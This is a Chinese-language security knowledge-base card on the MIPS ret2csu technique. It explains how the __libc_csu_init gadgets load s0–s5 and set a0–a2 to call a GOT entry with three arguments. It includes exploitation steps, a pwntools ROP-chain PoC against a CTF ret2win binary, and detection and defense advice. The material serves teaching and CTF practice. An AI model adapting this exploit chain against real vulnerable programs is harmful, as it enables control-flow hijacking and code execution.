---
id: binary-pwn-rop-mips-ret2csu-libc-csu-init
title: MIPS ret2csu：__libc_csu_init 的 s0-s5 装载与 a0-a2 布置 gadget
type: scenario
domain: binary
path: binary/pwn/rop
technique: mips-ret2csu-libc-csu-init
tags:
- mips
- mipsel
- rop
- ret2csu
- libc-csu-init
- gadget
- ctf
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V225
  verified_at: '2026-11-07T06:40:15+08:00'
  notes: 已对照原文2312-2463行核对：loc_4009C0装载ra/s5-s0与jr ra延迟addiu sp,0x38、loc_4009A0的lw t9,0(s0);addiu s1,1;move a2,s5;move a1,s4;jalr t9;move a0,s3(延迟槽);bne s2,s1;addiu s0,4语义与原文一致；7个填充+s0=GOT、s1/s2=0xdead01/0xdead02、s3-s5三参数的PoC与原文exp一致
url: /docs/binary/pwn/rop/binary-pwn-rop-mips-ret2csu-libc-csu-init/
draft: false
kb_aliases:
- MIPS ret2csu
- __libc_csu_init MIPS
- loc_4009C0
- loc_4009A0
- s0-s5 装载
- a0 a1 a2 布置
---

## 一句话结论

MIPS 程序的 `__libc_csu_init` 尾部同样存在可复用的 ret2csu gadget：`loc_4009C0` 从栈上批量装载 `$ra/$s5/$s4/$s3/$s2/$s1/$s0` 后 `jr $ra`；`loc_4009A0` 用 `lw $t9,0($s0)`、`move $a2,$s5`、`move $a1,$s4`、`move $a0,$s3`（延迟槽）和 `jalr $t9` 完成“调用 `[s0]` 并传 a0-a2”，再用 `bne $s2,$s1` 控制是否循环。把 `$s0` 指向 `ret2win@got`、`$s3-$s5` 设为三个参数、`$s2=$s1+1`，即可一次调用带三参数的 `ret2win`。

## 原理

- **csu 代码片段**：`__libc_csu_init` 在 MIPS 上遍历 init_array，编译器生成两段可复用代码：
  - `loc_4009C0`：`lw $ra,0x1C+var_s18($sp); lw $s5,...; lw $s4,...; lw $s3,...; lw $s2,...; lw $s1,...; lw $s0,...; jr $ra; addiu $sp,0x38`。从栈上连续取 7 个值到 `$ra,$s5,$s4,$s3,$s2,$s1,$s0`，然后 `jr $ra`。
  - `loc_4009A0`：`lw $t9,0($s0); addiu $s1,1; move $a2,$s5; move $a1,$s4; jalr $t9; move $a0,$s3; bne $s2,$s1,loc_4009A0; addiu $s0,4`。`jalr $t9` 调用 `[s0]`，`move $a0,$s3` 位于延迟槽，保证 `$a0` 在进入被调函数前被赋值；`bne $s2,$s1` 若 `$s2 != $s1+1` 会循环到 `loc_4009A0`（`$s0` 每次 +4）。
- **为什么能控参**：`$s3/$s4/$s5` 分别是 `$a0/$a1/$a2` 的来源，`$s0` 是被调函数指针的地址（通常用 GOT 项，`lw $t9,0($s0)` 取出实际函数地址），`$ra` 设为 `loc_4009A0` 即可从 `loc_4009C0` 进入调用段；把 `$s1` 设为 `0xdead01`、`$s2` 设为 `$s1+1`，`bne` 不成立，避免重复循环。
- **与 x86 ret2csu 的差异**：x86 用 `pop rbx/rbp/r12-r15; call [r12+rbx*8]`；MIPS 用 `lw $s0` 指向 GOT 项、`lw $t9,0($s0)` 取函数指针，参数来自 `$s3-$s5`，且 `move $a0,$s3` 在延迟槽。链布局要按 MIPS 的 7 个连续装载与 `addiu $sp,0x38` 计算。
- **目标函数**：`ret2win(a1,a2,a3)` 在 `a1==0xDEADBEEF && a2==0xCAFEBABE && a3==0xD00DF00D` 时读 `encrypted_flag.dat` + `key.dat` 解密并输出；正好用 csu gadget 一次设置三个参数。

## 触发条件

- MIPS32 程序存在栈溢出，能覆盖 `$ra`/`$fp`。
- 二进制中保留 `__libc_csu_init`（未 strip 或可通过符号/特征定位），且 `loc_4009A0`/`loc_4009C0` gadget 未被优化掉。
- 目标函数地址可从 GOT/PLT 取得，且能通过 `lw $t9,0($s0)` 解引用调用；端序与地址已知。
- 目标函数参数可由 `$s3-$s5` 控制，且不需要栈上大块数据。

## 利用步骤

1. 用 IDA 定位 `__libc_csu_init`，确认 `loc_4009C0`（装载段）与 `loc_4009A0`（调用段）的地址。
2. 确认目标函数（如 `ret2win`）的 GOT 地址，或把 `$s0` 指向存放函数指针的可读地址。
3. 构造第一次溢出：`cyclic(0x24) + p32(gadget_csu1) + 7 个填充 + [s0 值, s1, s2, s3, s4, s5, ra]`；按 `loc_4009C0` 的加载顺序核对每个值落在哪个寄存器。
4. 设置 `s0 = ret2win@got`、`s1 = 0xdead01`、`s2 = 0xdead02`、`s3 = 0xDEADBEEF`、`s4 = 0xCAFEBABE`、`s5 = 0xD00DF00D`、`ra = gadget_csu2`（loc_4009A0）。
5. `loc_4009C0` 装载后 `jr ra` 进入 `loc_4009A0`，`lw t9,0(s0)` 取 `ret2win` 实际地址，`move a0/a1/a2` 设参，`jalr t9` 调用；`bne s2,s1` 不成立，`addiu s0,4` 后落入后续流程（通常直接返回/退出）。
6. 发送 payload，确认 `ret2win` 参数校验通过并输出 flag。

## PoC

```python
ret2win_got = 0x0411058     # ret2win 的 GOT 项（原文）
gadget_csu1 = 0x04009C0     # loc_4009C0：装载 ra/s5..s0
gadget_csu2 = 0x04009A0     # loc_4009A0：lw t9,0(s0); ... jalr t9

rop = ROP(elf)
rop.raw(gadget_csu1)
for _ in range(7):
    rop.raw(0xdeadbeef)     # 对齐 loc_4009C0 的 7 个装载
rop.raw(ret2win_got)        # s0
rop.raw(0xdead01)           # s1
rop.raw(0xdead02)           # s2（= s1+1，避免 bne 循环）
rop.raw(0xDEADBEEF)         # s3 -> a0
rop.raw(0xCAFEBABE)         # s4 -> a1
rop.raw(0xD00DF00D)         # s5 -> a2
rop.raw(gadget_csu2)        # ra -> 调用段

payload = cyclic(0x24) + rop.chain()
```

## 变体与关联

- **多次调用**：把 `$s2` 设为比 `$s1` 大，`bne` 成立会循环 `loc_4009A0`，`$s0` 每次 +4 可连续调用 GOT 表中相邻函数；但参数固定为 `$s3-$s5`，需要每次重排或使用其他 gadget。
- **无 csu**：用 `lw $a0/$a1/$a2/$t9,off($sp)` 的万能 gadget（见 [[binary-pwn-rop-mips32-stack-frame-gadget-args]]）；或栈迁移后用 SROP/ret2syscall。
- **静态链接**：静态程序的 `__libc_csu_init` 可能不同或不存在，改用 `read`/`syscall` gadget 或 SROP。
- **关联**：x86 ret2csu 的写 bss/`/bin/sh` 用法见 [[binary-pwn-rop-ret2csu-bss-binsh-libc-offset-mismatch]]；本卡是 MIPS 版本。

## 检测与防御

- **检测**：ROP 链中出现 `loc_4009C0`/`loc_4009A0` 地址、连续 7 个栈值装载、`lw $t9,0($s0)` 后 `jalr`；`$s3-$s5` 出现 `0xDEADBEEF/0xCAFEBABE/0xD00DF00D` 等特征参数。
- **防御**：启用 PIE/ASLR、canary、RELRO；strip 掉 `__libc_csu_init` 或编译优化去掉可复用尾段；减少 GOT 可读性与固定地址。
- **响应**：排查异常 `$s0` 指向 GOT、`$ra` 指向 csu 段、参数寄存器特征值；保留崩溃现场。
